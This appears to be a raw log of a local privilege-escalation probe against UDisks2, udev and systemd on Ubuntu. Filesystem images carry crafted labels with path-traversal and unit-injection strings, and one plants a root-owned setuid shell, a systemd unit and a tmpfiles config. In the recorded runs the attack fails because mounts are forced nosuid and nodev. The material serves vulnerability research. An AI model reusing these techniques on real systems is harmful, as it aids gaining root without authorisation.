## target and default proof
PRETTY_NAME="Ubuntu 24.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.4 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
Linux 4f5b414436ae 6.10.14-linuxkit #1 SMP Sat May 17 08:28:57 UTC 2025 aarch64 aarch64 aarch64 GNU/Linux
uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)
uid=1002(selfauth) gid=1002(selfauth) groups=1002(selfauth)
dbus	1.14.10-4ubuntu4.1
dosfstools	4.2-1.1build1
e2fsprogs	1.47.0-2.4~exp1ubuntu4.1
libblockdev-fs3:arm64	3.1.1-1ubuntu0.1
libblockdev-loop3:arm64	3.1.1-1ubuntu0.1
libudisks2-0:arm64	2.10.1-6ubuntu1.3
polkitd	124-2ubuntu1.24.04.3
systemd	255.4-1ubuntu8.15
udev	255.4-1ubuntu8.15
udisks2	2.10.1-6ubuntu1.3
util-linux	2.39.3-9ubuntu6.5
xfsprogs	6.6.0-1ubuntu2.1

## default service and bus reachability
enabled
active
# /usr/lib/systemd/system/udisks2.service
[Unit]
Description=Disk Manager
Documentation=man:udisks(8)

[Service]
Type=dbus
BusName=org.freedesktop.UDisks2
ExecStart=/usr/libexec/udisks2/udisksd
KillSignal=SIGINT

[Install]
WantedBy=graphical.target
:1.0                               1 systemd         root            :1.0          init.scope                  -       -
:1.3                             263 systemd-logind  root            :1.3          systemd-logind.service      -       -
:1.98609                      771164 systemd-resolve systemd-resolve :1.98609      systemd-resolved.service    -       -
org.freedesktop.DBus               1 systemd         root            -             init.scope                  -       -
org.freedesktop.UDisks2       729973 udisksd         root            :1.97175      udisks2.service             -       -
org.freedesktop.login1           263 systemd-logind  root            :1.3          systemd-logind.service      -       -
org.freedesktop.resolve1      771164 systemd-resolve systemd-resolve :1.98609      systemd-resolved.service    -       -
org.freedesktop.systemd1           1 systemd         root            :1.0          init.scope                  -       -

## active-user polkit actions
9:  <action id="org.freedesktop.udisks2.filesystem-mount">
97:  <action id="org.freedesktop.udisks2.filesystem-mount-system">
185:  <action id="org.freedesktop.udisks2.filesystem-mount-other-seat">
269:  <action id="org.freedesktop.udisks2.filesystem-mount-other-user">
323:  <action id="org.freedesktop.udisks2.filesystem-fstab">
1143:  <action id="org.freedesktop.udisks2.loop-setup">
2035:  <action id="org.freedesktop.udisks2.modify-device">
2121:  <action id="org.freedesktop.udisks2.modify-device-system">
2207:  <action id="org.freedesktop.udisks2.modify-device-other-seat">

## udev/systemd metadata consumers
   137	# by-label/by-uuid links (filesystem metadata)
   138	# Skip bcache backing devices, handled in 69-bcache.rules
   139	ENV{ID_FS_TYPE}=="bcache", GOTO="skip_bcache_fs_type"
   140	ENV{ID_FS_USAGE}=="filesystem|other|crypto", ENV{ID_FS_UUID_ENC}=="?*", SYMLINK+="disk/by-uuid/$env{ID_FS_UUID_ENC}"
   141	ENV{ID_FS_USAGE}=="filesystem|other|crypto", ENV{ID_FS_LABEL_ENC}=="?*", SYMLINK+="disk/by-label/$env{ID_FS_LABEL_ENC}"
   142	LABEL="skip_bcache_fs_type"
   143	
   144	# by-id (World Wide Name)
   145	ENV{ID_WWN_WITH_EXTENSION}=="?*", SYMLINK+="disk/by-id/wwn-$env{ID_WWN_WITH_EXTENSION}$env{.PART_SUFFIX}"
   146	
   147	# by-partlabel/by-partuuid links (partition metadata)
   148	ENV{ID_PART_ENTRY_UUID}=="?*", SYMLINK+="disk/by-partuuid/$env{ID_PART_ENTRY_UUID}"
   149	ENV{ID_PART_ENTRY_SCHEME}=="gpt", ENV{ID_PART_ENTRY_NAME}=="?*", SYMLINK+="disk/by-partlabel/$env{ID_PART_ENTRY_NAME}"
   150	
   151	# by-diskseq link (if an app is told to open a path like this, they may parse
   152	# the diskseq number from the path, then issue BLKGETDISKSEQ to verify they really got
   153	# the right device, to access specific disks in a race-free fashion)
   154	ENV{DISKSEQ}=="?*", ENV{ID_IGNORE_DISKSEQ}!="1", SYMLINK+="disk/by-diskseq/$env{DISKSEQ}$env{.PART_SUFFIX}"
   155	
   156	# Create symlinks that allow referencing loopback devices by their backing file's inode number
   157	ENV{ID_LOOP_BACKING_DEVICE}!="", ENV{ID_LOOP_BACKING_INODE}!="", SYMLINK+="disk/by-loop-inode/$env{ID_LOOP_BACKING_DEVICE}-$env{ID_LOOP_BACKING_INODE}$env{.PART_SUFFIX}"
   158	
   159	# Similar, but uses the .lo_file_name field of the loopback device (note that
   160	# this is basically just a free-form string passed from userspace to the kernel
   161	# when the device is created, it is not necessarily a file system path like the
   162	# "loop/backing_file" sysfs attribute, which is always an absolute path)
   163	ENV{ID_LOOP_BACKING_FILENAME_ENC}!="", SYMLINK+="disk/by-loop-ref/$env{ID_LOOP_BACKING_FILENAME_ENC}$env{.PART_SUFFIX}"
   164	
     1	# This file contains udev rules for udisks 2.x
     2	#
     3	# Do not edit this file, it will be overwritten on updates
     4	#
     5	
     6	# ------------------------------------------------------------------------
     7	# Probing
     8	# ------------------------------------------------------------------------
     9	
    10	# Skip probing if not a block device or if requested by other rules
    11	#
    12	SUBSYSTEM!="block", GOTO="udisks_probe_end"
    13	ENV{DM_MULTIPATH_DEVICE_PATH}=="1", GOTO="udisks_probe_end"
    14	ENV{DM_UDEV_DISABLE_OTHER_RULES_FLAG}=="?*", GOTO="udisks_probe_end"
    15	
    16	# MD-RAID (aka Linux Software RAID) members
    17	#
    18	# TODO: file bug against mdadm(8) to have --export-prefix option that can be used with e.g. UDISKS_MD_MEMBER
    19	#
    20	SUBSYSTEM=="block", ENV{ID_FS_USAGE}=="raid", ENV{ID_FS_TYPE}=="linux_raid_member", ENV{UDISKS_MD_MEMBER_LEVEL}=="", IMPORT{program}="/bin/sh -c '/sbin/mdadm --examine --export $tempnode | /bin/sed s/^MD_/UDISKS_MD_MEMBER_/g'"
    21	
    22	SUBSYSTEM=="block", KERNEL=="md*", ENV{DEVTYPE}!="partition", IMPORT{program}="/bin/sh -c '/sbin/mdadm --detail --export $tempnode | /bin/sed s/^MD_/UDISKS_MD_/g'"
    23	
    24	LABEL="udisks_probe_end"
    25	
    26	# ------------------------------------------------------------------------
    27	# Tag floppy drives since they need special care
    28	
    29	# PC floppy drives
    30	#
    31	KERNEL=="fd*", ENV{ID_DRIVE_FLOPPY}="1"
    32	
    33	# USB floppy drives
    34	#
    35	SUBSYSTEMS=="usb", ATTRS{bInterfaceClass}=="08", ATTRS{bInterfaceSubClass}=="04", ENV{ID_DRIVE_FLOPPY}="1"
    36	
    37	# ATA Zip drives
    38	#
    50	# use the /sys/subsystem/ path for this. Kernel "bus" and "class" names
    51	# should be treated as one namespace, like udev handles it. This is mostly
    52	# just an identification string for systemd, so whether the path actually is
    53	# accessible or not does not matter as long as it is unique and in the
    54	# filesystem namespace.
    55	
    56	SUBSYSTEM=="net", KERNEL!="lo", TAG+="systemd", ENV{SYSTEMD_ALIAS}+="/sys/subsystem/net/devices/$name"
    57	SUBSYSTEM=="bluetooth", TAG+="systemd", ENV{SYSTEMD_ALIAS}+="/sys/subsystem/bluetooth/devices/%k", \
    58	  ENV{SYSTEMD_WANTS}+="bluetooth.target", ENV{SYSTEMD_USER_WANTS}+="bluetooth.target"
    59	
    60	ENV{ID_SMARTCARD_READER}=="?*", TAG+="systemd", ENV{SYSTEMD_WANTS}+="smartcard.target", ENV{SYSTEMD_USER_WANTS}+="smartcard.target"
    61	SUBSYSTEM=="sound", KERNEL=="controlC*", TAG+="systemd", ENV{SYSTEMD_WANTS}+="sound.target", ENV{SYSTEMD_USER_WANTS}+="sound.target"
    62	
    63	SUBSYSTEM=="printer", TAG+="systemd", ENV{SYSTEMD_WANTS}+="printer.target", ENV{SYSTEMD_USER_WANTS}+="printer.target"
    64	SUBSYSTEM=="usb", KERNEL=="lp*", TAG+="systemd", ENV{SYSTEMD_WANTS}+="printer.target", ENV{SYSTEMD_USER_WANTS}+="printer.target"
    65	SUBSYSTEM=="usb", ENV{DEVTYPE}=="usb_device", ENV{ID_USB_INTERFACES}=="*:0701??:*", TAG+="systemd", ENV{SYSTEMD_WANTS}+="printer.target", ENV{SYSTEMD_USER_WANTS}+="printer.target"
    66	
    67	SUBSYSTEM=="udc", TAG+="systemd", ENV{SYSTEMD_WANTS}+="usb-gadget.target"
    68	
    69	# Apply sysctl variables to network devices (and only to those) as they appear.
    70	ACTION=="add", SUBSYSTEM=="net", KERNEL!="lo", RUN+="/usr/lib/systemd/systemd-sysctl --prefix=/net/ipv4/conf/$name --prefix=/net/ipv4/neigh/$name --prefix=/net/ipv6/conf/$name --prefix=/net/ipv6/neigh/$name"
    71	
    72	# Pull in backlight save/restore for all backlight devices and
    73	# keyboard backlights
    74	SUBSYSTEM=="backlight", TAG+="systemd", IMPORT{builtin}="path_id", ENV{SYSTEMD_WANTS}+="systemd-backlight@backlight:$name.service"
    75	SUBSYSTEM=="leds", KERNEL=="*kbd_backlight*", TAG+="systemd", IMPORT{builtin}="path_id", ENV{SYSTEMD_WANTS}+="systemd-backlight@leds:$name.service"
    76	
    77	# Pull in rfkill save/restore for all rfkill devices
    78	SUBSYSTEM=="rfkill", ENV{SYSTEMD_RFKILL}="1"
    79	SUBSYSTEM=="rfkill", IMPORT{builtin}="path_id"
    80	SUBSYSTEM=="misc", KERNEL=="rfkill", TAG+="systemd", ENV{SYSTEMD_WANTS}+="systemd-rfkill.socket"
    81	
    82	# Asynchronously mount file systems implemented by these modules as soon as they are loaded.
    83	SUBSYSTEM=="module", KERNEL=="fuse", TAG+="systemd", ENV{SYSTEMD_WANTS}+="sys-fs-fuse-connections.mount"
    84	SUBSYSTEM=="module", KERNEL=="configfs", TAG+="systemd", ENV{SYSTEMD_WANTS}+="sys-kernel-config.mount"
    85	
    86	LABEL="systemd_end"
    33	# [defaults]
    34	# allow=exec,noexec,nodev,nosuid,atime,noatime,nodiratime,relatime,strictatime,lazytime,ro,rw,sync,dirsync,noload,acl,nosymfollow
    35	# 
    36	# vfat_defaults=uid=$UID,gid=$GID,shortname=mixed,utf8=1,showexec,flush
    37	# vfat_allow=uid=$UID,gid=$GID,flush,utf8,shortname,umask,dmask,fmask,codepage,iocharset,usefree,showexec
    38	# 
    39	# # common options for both the native kernel driver and exfat-fuse
    40	# exfat_defaults=uid=$UID,gid=$GID,iocharset=utf8,errors=remount-ro
    41	# exfat_allow=uid=$UID,gid=$GID,dmask,errors,fmask,iocharset,namecase,umask
    42	# 
    43	# # 'ntfs' signature, definitions for the legacy ntfs kernel driver and the ntfs-3g fuse driver
    44	# ntfs:ntfs_defaults=uid=$UID,gid=$GID,windows_names
    45	# ntfs:ntfs_allow=uid=$UID,gid=$GID,umask,dmask,fmask,locale,norecover,ignore_case,windows_names,compression,nocompression,big_writes
    46	# 
    47	# # 'ntfs' signature, the new 'ntfs3' kernel driver
    48	# ntfs:ntfs3_defaults=uid=$UID,gid=$GID
    49	# ntfs:ntfs3_allow=uid=$UID,gid=$GID,umask,dmask,fmask,iocharset,discard,nodiscard,sparse,nosparse,hidden,nohidden,sys_immutable,nosys_immutable,showmeta,noshowmeta,prealloc,noprealloc,hide_dot_files,nohide_dot_files,windows_names,nocase,case
    50	# 
    51	# # define order of filesystem driver priorities for the actual mount call,
    52	# # required definition for non-matching driver names
    53	# ntfs_drivers=ntfs3,ntfs
    54	# 
    55	# iso9660_defaults=uid=$UID,gid=$GID,iocharset=utf8,mode=0400,dmode=0500
    56	# iso9660_allow=uid=$UID,gid=$GID,norock,nojoliet,iocharset,mode,dmode
    57	# 
    58	# udf_defaults=uid=$UID,gid=$GID,iocharset=utf8
    59	# udf_allow=uid=$UID,gid=$GID,iocharset,utf8,umask,mode,dmode,unhide,undelete
    60	# 
    61	# hfsplus_defaults=uid=$UID,gid=$GID,nls=utf8
    62	# hfsplus_allow=uid=$UID,gid=$GID,creator,type,umask,session,part,decompose,nodecompose,force,nls
    63	# 
    64	# btrfs_allow=compress,compress-force,datacow,nodatacow,datasum,nodatasum,autodefrag,noautodefrag,degraded,device,discard,nodiscard,subvol,subvolid,space_cache
    65	# 
    66	# f2fs_allow=discard,nodiscard,compress_algorithm,compress_log_size,compress_extension,alloc_mode
    67	# 
    68	# xfs_allow=discard,nodiscard,inode32,largeio,wsync
    69	# 
    70	# reiserfs_allow=hashed_relocation,no_unhashed_relocation,noborder,notail
    71	# 
    72	# ext2_defaults=errors=remount-ro
    73	# ext2_allow=errors=remount-ro
    74	# 
    75	# ext3_defaults=errors=remount-ro
    76	# ext3_allow=errors=remount-ro
    77	# 
    78	# ext4_defaults=errors=remount-ro
    79	# ext4_allow=errors=remount-ro

## writable trust-root checks as attacker
drwxr-xr-x root:root /etc/udisks2
attacker_not_writable:/etc/udisks2
drwxr-xr-x root:root /etc/udev/rules.d
attacker_not_writable:/etc/udev/rules.d
drwxr-xr-x root:root /usr/lib/udev/rules.d
attacker_not_writable:/usr/lib/udev/rules.d
drwxr-xr-x root:root /usr/lib/systemd/system
attacker_not_writable:/usr/lib/systemd/system
drwxr-xr-x root:root /etc/systemd/system
attacker_not_writable:/etc/systemd/system
drwxr-xr-x root:root /media
attacker_not_writable:/media
drwxr-xr-x root:root /run/systemd
attacker_not_writable:/run/systemd
drwxr-xr-x root:root /usr/local/sbin
attacker_not_writable:/usr/local/sbin
drwxr-xr-x root:root /usr/local/bin
attacker_not_writable:/usr/local/bin
drwxrwxrwt root:root /tmp
attacker_writable:/tmp
drwxrwxrwt root:root /var/tmp
attacker_writable:/var/tmp

## active session
uid=1002(selfauth) gid=1002(selfauth) groups=1002(selfauth)
/dev/tty1
XDG_SESSION_ID=126
Id=126
User=1002
Name=selfauth
Seat=seat0
TTY=tty1
Remote=no
Type=tty
Class=user
Active=yes
State=active

## image creation
total 70468
-rw-rw-r-- 1 selfauth selfauth 100663296 May 16 19:01 ext4-SYSTEMD_WANTS=udisks-meta-pwn.service.img
-rwxr-xr-x 1 selfauth selfauth      4227 May 16 19:01 probe.sh
-rwxr-xr-x 1 selfauth selfauth       128 May 16 19:01 seed-root-payload.sh
-rw-r--r-- 1 selfauth selfauth       158 May 16 19:01 udisks-meta-pwn.service
-rw-r--r-- 1 selfauth selfauth        84 May 16 19:01 udisks-meta-tmpfiles.conf
-rw-rw-r-- 1 selfauth selfauth  67108864 May 16 19:01 vfat-SYSTEMD_WANTS=udisks-meta-pwn.service.img
-rw-rw-r-- 1 selfauth selfauth 402653184 May 16 19:01 xfs-SYSTEMD_WANTS=udisks-meta-pwn.service.img
debugfs 1.47.0 (5-Feb-2023)
debugfs:  mkdir etc
debugfs:  mkdir etc/systemd
debugfs:  mkdir etc/systemd/system
debugfs:  mkdir usr
debugfs:  mkdir usr/lib
debugfs:  mkdir usr/lib/tmpfiles.d
debugfs:  <.service etc/systemd/system/udisks-meta-pwn.service
Allocated inode: 18
debugfs:  <pfiles.conf usr/lib/tmpfiles.d/udisks-meta-pwn.conf
Allocated inode: 19
debugfs:  write /bin/dash suidsh
Allocated inode: 20
debugfs:  set_inode_field suidsh mode 0104755
debugfs:  set_inode_field suidsh uid 0
debugfs:  set_inode_field suidsh gid 0
debugfs:  mkfs.fat 4.2 (2021-01-31)

## loop setup ext4
Mapped file /home/selfauth/udisks-metadata-systemd/ext4-SYSTEMD_WANTS=udisks-meta-pwn.service.img as /dev/loop0.
dev=/dev/loop0
DEVLINKS=/dev/disk/by-loop-inode/0:60-5426052 /dev/disk/by-diskseq/263 /dev/disk/by-label/meta\x2f..\x2fx.mount /dev/disk/by-uuid/11111111-2222-4333-8444-555555555555
ID_FS_BLOCKSIZE=4096
ID_FS_LABEL=meta/../x.mount
ID_FS_LABEL_ENC=meta\x2f..\x2fx.mount
ID_FS_LASTBLOCK=24576
ID_FS_SIZE=100663296
ID_FS_TYPE=ext4
ID_FS_USAGE=filesystem
ID_FS_UUID=11111111-2222-4333-8444-555555555555
ID_FS_UUID_ENC=11111111-2222-4333-8444-555555555555
ID_FS_VERSION=1.0
ID_LOOP_BACKING_DEVICE=0:60
ID_LOOP_BACKING_INODE=5426052
ls: cannot access '/dev/disk/by-loop-ref': No such file or directory
/dev/disk/by-label:
total 0
lrwxrwxrwx 1 root root 11 May 16 19:01 meta\x2f..\x2fx.mount -> ../../loop0

/dev/disk/by-uuid:
total 0
lrwxrwxrwx 1 root root 11 May 16 19:01 11111111-2222-4333-8444-555555555555 -> ../../loop0
lrwxrwxrwx 1 root root  9 May 16 15:18 27685418-1790-40c3-bbc1-ea2342957362 -> ../../vdb
lrwxrwxrwx 1 root root 10 May 16 15:18 55897b87-5d1f-4f12-8931-37b6e249877b -> ../../vda1

## loop setup vfat
Mapped file /home/selfauth/udisks-metadata-systemd/vfat-SYSTEMD_WANTS=udisks-meta-pwn.service.img as /dev/loop1.
dev=/dev/loop1
DEVLINKS=/dev/disk/by-uuid/DEAD-BEEF /dev/disk/by-diskseq/264 /dev/disk/by-label/UDMETA\x20PWN /dev/disk/by-loop-inode/0:60-5426053
ID_FS_BLOCKSIZE=2048
ID_FS_LABEL=UDMETA_PWN
ID_FS_LABEL_ENC=UDMETA\x20PWN
ID_FS_SIZE=67108864
ID_FS_TYPE=vfat
ID_FS_USAGE=filesystem
ID_FS_UUID=DEAD-BEEF
ID_FS_UUID_ENC=DEAD-BEEF
ID_FS_VERSION=FAT16
ID_LOOP_BACKING_DEVICE=0:60
ID_LOOP_BACKING_INODE=5426053
ls: cannot access '/dev/disk/by-loop-ref': No such file or directory
/dev/disk/by-label:
total 0
lrwxrwxrwx 1 root root 11 May 16 19:01 UDMETA\x20PWN -> ../../loop1
lrwxrwxrwx 1 root root 11 May 16 19:01 meta\x2f..\x2fx.mount -> ../../loop0

/dev/disk/by-uuid:
total 0
lrwxrwxrwx 1 root root 11 May 16 19:01 11111111-2222-4333-8444-555555555555 -> ../../loop0
lrwxrwxrwx 1 root root  9 May 16 15:18 27685418-1790-40c3-bbc1-ea2342957362 -> ../../vdb
lrwxrwxrwx 1 root root 10 May 16 15:18 55897b87-5d1f-4f12-8931-37b6e249877b -> ../../vda1
lrwxrwxrwx 1 root root 11 May 16 19:01 DEAD-BEEF -> ../../loop1

## loop setup xfs
Mapped file /home/selfauth/udisks-metadata-systemd/xfs-SYSTEMD_WANTS=udisks-meta-pwn.service.img as /dev/loop2.
dev=/dev/loop2
DEVLINKS=/dev/disk/by-uuid/aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee /dev/disk/by-diskseq/265 /dev/disk/by-loop-inode/0:60-5426054 /dev/disk/by-label/XFS..mount
ID_FS_BLOCKSIZE=4096
ID_FS_LABEL=XFS..mount
ID_FS_LABEL_ENC=XFS..mount
ID_FS_LASTBLOCK=98304
ID_FS_SIZE=335544320
ID_FS_TYPE=xfs
ID_FS_USAGE=filesystem
ID_FS_UUID=aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee
ID_FS_UUID_ENC=aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee
ID_LOOP_BACKING_DEVICE=0:60
ID_LOOP_BACKING_INODE=5426054
UDISKS_AUTO=0
ls: cannot access '/dev/disk/by-loop-ref': No such file or directory
/dev/disk/by-label:
total 0
lrwxrwxrwx 1 root root 11 May 16 19:01 UDMETA\x20PWN -> ../../loop1
lrwxrwxrwx 1 root root 11 May 16 19:01 XFS..mount -> ../../loop2
lrwxrwxrwx 1 root root 11 May 16 19:01 meta\x2f..\x2fx.mount -> ../../loop0

/dev/disk/by-uuid:
total 0
lrwxrwxrwx 1 root root 11 May 16 19:01 11111111-2222-4333-8444-555555555555 -> ../../loop0
lrwxrwxrwx 1 root root  9 May 16 15:18 27685418-1790-40c3-bbc1-ea2342957362 -> ../../vdb
lrwxrwxrwx 1 root root 10 May 16 15:18 55897b87-5d1f-4f12-8931-37b6e249877b -> ../../vda1
lrwxrwxrwx 1 root root 11 May 16 19:01 DEAD-BEEF -> ../../loop1
lrwxrwxrwx 1 root root 11 May 16 19:01 aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee -> ../../loop2

## mount option probes ext4 /dev/loop0
Error mounting /dev/loop0: GDBus.Error:org.freedesktop.UDisks2.Error.OptionNotPermitted: Mount option `suid' is not allowed
Error mounting /dev/loop0: GDBus.Error:org.freedesktop.UDisks2.Error.OptionNotPermitted: Mount option `dev' is not allowed

## default mount ext4 /dev/loop0
Mounted /dev/loop0 at /media/selfauth/meta_.._x.mount
mountpoint=/media/selfauth/meta_.._x.mount
/media/selfauth/meta_.._x.mount /dev/loop0 ext4   rw,nosuid,nodev,relatime,errors=remount-ro
drwxr-xr-x root:root /media
drwxr-x--- root:root /media/selfauth
drwxr-xr-x root:root /media/selfauth/meta_.._x.mount
systemd_escape_mount_unit=media-selfauth-meta_.._x.mount.mount
Where=/media/selfauth/meta_.._x.mount
What=/dev/loop0
Id=media-selfauth-meta_.._x.mount.mount
LoadState=loaded
ActiveState=active
FragmentPath=
SourcePath=/proc/self/mountinfo
## ext4 mounted metadata and nosuid execution
-rw-r--r-- root:root /media/selfauth/meta_.._x.mount/etc/systemd/system/udisks-meta-pwn.service -> 
-rw-r--r-- root:root /media/selfauth/meta_.._x.mount/usr/lib/tmpfiles.d/udisks-meta-pwn.conf -> 
-rwsr-xr-x root:root /media/selfauth/meta_.._x.mount/suidsh -> 
drwx------ root:root /media/selfauth/meta_.._x.mount/lost+found -> 
drwxr-xr-x root:root /media/selfauth/meta_.._x.mount -> 
drwxr-xr-x root:root /media/selfauth/meta_.._x.mount/etc -> 
drwxr-xr-x root:root /media/selfauth/meta_.._x.mount/etc/systemd -> 
drwxr-xr-x root:root /media/selfauth/meta_.._x.mount/etc/systemd/system -> 
drwxr-xr-x root:root /media/selfauth/meta_.._x.mount/usr -> 
drwxr-xr-x root:root /media/selfauth/meta_.._x.mount/usr/lib -> 
drwxr-xr-x root:root /media/selfauth/meta_.._x.mount/usr/lib/tmpfiles.d -> 
find: ‘/media/selfauth/meta_.._x.mount/lost+found’: Permission denied
uid=1002(selfauth) gid=1002(selfauth) groups=1002(selfauth)
touch: cannot touch '/root/udisks-metadata-systemd-root': Permission denied
touch: cannot touch '/run/udisks-metadata-systemd-root': Permission denied
No files found for udisks-meta-pwn.service.

## mount option probes vfat /dev/loop1
Error mounting /dev/loop1: GDBus.Error:org.freedesktop.UDisks2.Error.OptionNotPermitted: Mount option `suid' is not allowed
Error mounting /dev/loop1: GDBus.Error:org.freedesktop.UDisks2.Error.OptionNotPermitted: Mount option `dev' is not allowed
Error mounting /dev/loop1: GDBus.Error:org.freedesktop.UDisks2.Error.OptionNotPermitted: Mount option `uid=0' is not allowed

## default mount vfat /dev/loop1
Mounted /dev/loop1 at /media/selfauth/UDMETA PWN
mountpoint=/media/selfauth/UDMETA PWN
/media/selfauth/UDMETA PWN /dev/loop1 vfat   rw,nosuid,nodev,relatime,uid=1002,gid=1002,fmask=0022,dmask=0022,codepage=437,iocharset=iso8859-1,shortname=mixed,showexec,utf8,flush,errors=remount-ro
drwxr-xr-x root:root /media
drwxr-x--- root:root /media/selfauth
drwxr-xr-x selfauth:selfauth /media/selfauth/UDMETA PWN
systemd_escape_mount_unit=media-selfauth-UDMETA\x20PWN.mount
Where=/media/selfauth/UDMETA PWN
What=/dev/loop1
Id=media-selfauth-UDMETA\x20PWN.mount
LoadState=loaded
ActiveState=active
FragmentPath=
SourcePath=/proc/self/mountinfo

## mount option probes xfs /dev/loop2
Error mounting /dev/loop2: GDBus.Error:org.freedesktop.UDisks2.Error.OptionNotPermitted: Mount option `suid' is not allowed
Error mounting /dev/loop2: GDBus.Error:org.freedesktop.UDisks2.Error.OptionNotPermitted: Mount option `dev' is not allowed

## default mount xfs /dev/loop2
Mounted /dev/loop2 at /media/selfauth/XFS..mount
mountpoint=/media/selfauth/XFS..mount
/media/selfauth/XFS..mount /dev/loop2 xfs    rw,nosuid,nodev,relatime,attr2,inode64,logbufs=8,logbsize=32k,noquota
drwxr-xr-x root:root /media
drwxr-x--- root:root /media/selfauth
drwxr-xr-x root:root /media/selfauth/XFS..mount
systemd_escape_mount_unit=media-selfauth-XFS..mount.mount
Where=
What=
Id=media-selfauth-XFS..mount.mount
LoadState=not-found
ActiveState=inactive
FragmentPath=
SourcePath=

## user-side root marker check
ls: cannot access '/root/udisks-metadata-systemd-root': Permission denied
ls: cannot access '/run/udisks-metadata-systemd-root': No such file or directory
ls: cannot access '/tmp/udisks-metadata-systemd-root': No such file or directory

## root-side udev/systemd state after active UDisks operations
# ext4 /dev/loop0 /home/selfauth/udisks-metadata-systemd/ext4-SYSTEMD_WANTS=udisks-meta-pwn.service.img
DEVLINKS=/dev/disk/by-uuid/11111111-2222-4333-8444-555555555555 /dev/disk/by-loop-inode/0:60-5426052 /dev/disk/by-diskseq/263 /dev/disk/by-label/meta\x2f..\x2fx.mount
ID_FS_BLOCKSIZE=4096
ID_FS_LABEL=meta/../x.mount
ID_FS_LABEL_ENC=meta\x2f..\x2fx.mount
ID_FS_LASTBLOCK=24576
ID_FS_SIZE=100663296
ID_FS_TYPE=ext4
ID_FS_USAGE=filesystem
ID_FS_UUID=11111111-2222-4333-8444-555555555555
ID_FS_UUID_ENC=11111111-2222-4333-8444-555555555555
ID_FS_VERSION=1.0
ID_LOOP_BACKING_DEVICE=0:60
ID_LOOP_BACKING_INODE=5426052
systemd_escape_device_unit=dev-loop0.device
SysFSPath=/sys/devices/virtual/block/loop0
Id=dev-loop0.device
LoadState=loaded
ActiveState=active
FragmentPath=
# vfat /dev/loop1 /home/selfauth/udisks-metadata-systemd/vfat-SYSTEMD_WANTS=udisks-meta-pwn.service.img
DEVLINKS=/dev/disk/by-uuid/DEAD-BEEF /dev/disk/by-diskseq/264 /dev/disk/by-loop-inode/0:60-5426053 /dev/disk/by-label/UDMETA\x20PWN
ID_FS_BLOCKSIZE=2048
ID_FS_LABEL=UDMETA_PWN
ID_FS_LABEL_ENC=UDMETA\x20PWN
ID_FS_SIZE=67108864
ID_FS_TYPE=vfat
ID_FS_USAGE=filesystem
ID_FS_UUID=DEAD-BEEF
ID_FS_UUID_ENC=DEAD-BEEF
ID_FS_VERSION=FAT16
ID_LOOP_BACKING_DEVICE=0:60
ID_LOOP_BACKING_INODE=5426053
systemd_escape_device_unit=dev-loop1.device
SysFSPath=/sys/devices/virtual/block/loop1
Id=dev-loop1.device
LoadState=loaded
ActiveState=active
FragmentPath=
# xfs /dev/loop2 /home/selfauth/udisks-metadata-systemd/xfs-SYSTEMD_WANTS=udisks-meta-pwn.service.img
DEVLINKS=/dev/disk/by-uuid/aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee /dev/disk/by-label/XFS..mount /dev/disk/by-diskseq/265 /dev/disk/by-loop-inode/0:60-5426054
ID_FS_BLOCKSIZE=4096
ID_FS_LABEL=XFS..mount
ID_FS_LABEL_ENC=XFS..mount
ID_FS_LASTBLOCK=98304
ID_FS_SIZE=335544320
ID_FS_TYPE=xfs
ID_FS_USAGE=filesystem
ID_FS_UUID=aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee
ID_FS_UUID_ENC=aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee
ID_LOOP_BACKING_DEVICE=0:60
ID_LOOP_BACKING_INODE=5426054
UDISKS_AUTO=0
systemd_escape_device_unit=dev-loop2.device
SysFSPath=/sys/devices/virtual/block/loop2
Id=dev-loop2.device
LoadState=loaded
ActiveState=active
FragmentPath=

## root-side mounted media and generated mount units
/media/selfauth/meta_.._x.mount /dev/loop0 ext4 rw,nosuid,nodev,relatime,errors=remount-ro
/media/selfauth/UDMETA\x20PWN /dev/loop1 vfat rw,nosuid,nodev,relatime,uid=1002,gid=1002,fmask=0022,dmask=0022,codepage=437,iocharset=iso8859-1,shortname=mixed,showexec,utf8,flush,errors=remount-ro
/media/selfauth/XFS..mount /dev/loop2 xfs rw,nosuid,nodev,relatime,attr2,inode64,logbufs=8,logbsize=32k,noquota
# ext4 /dev/loop0 /media/selfauth/meta_.._x.mount
drwxr-xr-x root:root /media
drwxr-x--- root:root /media/selfauth
drwxr-xr-x root:root /media/selfauth/meta_.._x.mount
mount_unit=media-selfauth-meta_.._x.mount.mount
Where=/media/selfauth/meta_.._x.mount
What=/dev/loop0
Id=media-selfauth-meta_.._x.mount.mount
LoadState=loaded
ActiveState=active
FragmentPath=
SourcePath=/proc/self/mountinfo
# vfat /dev/loop1 /media/selfauth/UDMETA PWN
drwxr-xr-x root:root /media
drwxr-x--- root:root /media/selfauth
drwxr-xr-x selfauth:selfauth /media/selfauth/UDMETA PWN
mount_unit=media-selfauth-UDMETA\x20PWN.mount
Where=/media/selfauth/UDMETA PWN
What=/dev/loop1
Id=media-selfauth-UDMETA\x20PWN.mount
LoadState=loaded
ActiveState=active
FragmentPath=
SourcePath=/proc/self/mountinfo
# xfs /dev/loop2 /media/selfauth/XFS..mount
drwxr-xr-x root:root /media
drwxr-x--- root:root /media/selfauth
drwxr-xr-x root:root /media/selfauth/XFS..mount
mount_unit=media-selfauth-XFS..mount.mount
Where=
What=
Id=media-selfauth-XFS..mount.mount
LoadState=not-found
ActiveState=inactive
FragmentPath=
SourcePath=
  dev-disk-by\x2dloop\x2dinode-0:60\x2d5426052.device                                               loaded    active   plugged /dev/disk/by-loop-inode/0:60-5426052
  dev-disk-by\x2dloop\x2dinode-0:60\x2d5426053.device                                               loaded    active   plugged /dev/disk/by-loop-inode/0:60-5426053
  dev-disk-by\x2dloop\x2dinode-0:60\x2d5426054.device                                               loaded    active   plugged /dev/disk/by-loop-inode/0:60-5426054
  dev-loop0.device                                                                                  loaded    active   plugged /dev/loop0
  dev-loop1.device                                                                                  loaded    active   plugged /dev/loop1
